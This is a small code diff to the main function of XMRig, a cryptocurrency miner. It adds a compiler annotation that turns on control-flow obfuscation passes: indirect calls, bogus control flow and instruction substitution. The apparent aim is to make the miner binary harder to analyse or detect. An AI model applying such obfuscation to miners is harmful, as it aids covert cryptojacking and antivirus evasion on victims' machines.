@@ -21,7 +21,7 @@
 #include "base/kernel/Process.h"
 
 
-int main(int argc, char **argv)
+int __attribute__((__annotate__(("indirectcall,indirectbr,aliasaccess,boguscfg,substitution")))) main(int argc, char **argv)
 {
     using namespace xmrig;
 
